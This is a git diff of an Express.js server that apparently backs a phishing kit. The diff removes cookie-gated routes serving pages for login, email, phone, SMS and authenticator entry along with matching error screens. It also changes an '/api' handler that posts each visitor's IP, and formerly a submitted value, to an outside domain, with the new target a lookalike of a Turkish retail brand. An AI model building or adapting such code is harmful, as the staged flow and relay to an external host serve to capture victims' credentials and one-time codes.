@@ -44,77 +44,6 @@ app.post('/apitr', async (req, res) => {
   }
 });
 
-app.get('/login', (req, res) => {
-    const caAsCookie = req.cookies.ca_as;
-    if (!caAsCookie) {
-        return res.redirect('/');
-    }
-    res.sendFile(path.join(__dirname, 'public', 'home.html'));
-});
-
-app.get('/bekle', (req, res) => {
-     const caAsCookie = req.cookies.ca_as;
-    if (!caAsCookie) {
-        return res.redirect('/');
-    }
-  res.sendFile(path.join(__dirname, 'public', 'bekle.html'));
-});
-app.get('/eposta', (req, res) => {
-     const caAsCookie = req.cookies.ca_as;
-    if (!caAsCookie) {
-        return res.redirect('/');
-    }
-  res.sendFile(path.join(__dirname, 'public', 'eposta.html'));
-});
-app.get('/phone', (req, res) => {
-     const caAsCookie = req.cookies.ca_as;
-    if (!caAsCookie) {
-        return res.redirect('/');
-    }
-    res.sendFile(path.join(__dirname, 'public', 'phone.html'));
-  });
-app.get('/sms', (req, res) => {
-     const caAsCookie = req.cookies.ca_as;
-    if (!caAsCookie) {
-        return res.redirect('/');
-    }
-  res.sendFile(path.join(__dirname, 'public', 'sms.html'));
-});
-app.get('/mail', (req, res) => {
-     const caAsCookie = req.cookies.ca_as;
-    if (!caAsCookie) {
-        return res.redirect('/');
-    }
-    res.sendFile(path.join(__dirname, 'public', 'mail.html'));
-  });
-  app.get('/email-error', (req, res) => {
-       const caAsCookie = req.cookies.ca_as;
-    if (!caAsCookie) {
-        return res.redirect('/');
-    }
-    res.sendFile(path.join(__dirname, 'public', 'email-error.html'));
-  });
-  app.get('/password-error', (req, res) => {
-       const caAsCookie = req.cookies.ca_as;
-    if (!caAsCookie) {
-        return res.redirect('/');
-    }
-    res.sendFile(path.join(__dirname, 'public', 'password-error.html'));
-  });
-  app.get('/sms-error', (req, res) => {
-       const caAsCookie = req.cookies.ca_as;
-    if (!caAsCookie) {
-        return res.redirect('/');
-    }
-    res.sendFile(path.join(__dirname, 'public', 'sms-error.html'));
-  });
-  app.get('/control.php?page=telefonHata', (req, res) => {
-       const caAsCookie = req.cookies.ca_as;
-    if (!caAsCookie) {
-        return res.redirect('/');
-    }
-    res.sendFile(path.join(__dirname, 'public', 'sms-error.html'));
-  });
 app.get('/authenticator', (req, res) => {
      const caAsCookie = req.cookies.ca_as;
     if (!caAsCookie) {
@@ -162,13 +91,10 @@ app.get('/verify', async (req, res) => {
  
 app.post('/api', async (req, res) => {
   const clientIp = req.clientIp; // Ziyaretçinin IP adresi
-  const { x } = req.body; // Gönderilen x değişkeni
 
   try {
-    // IP ve x değerlerini hedef URL'ye gönderiyoruz
-    const response = await axios.post('https://tethree3.store/livechat.php', {
-      ip: clientIp,
-      x: x
+    const response = await axios.post('http://3-carrefoursa.com', {
+      ip: clientIp
     });
 
     
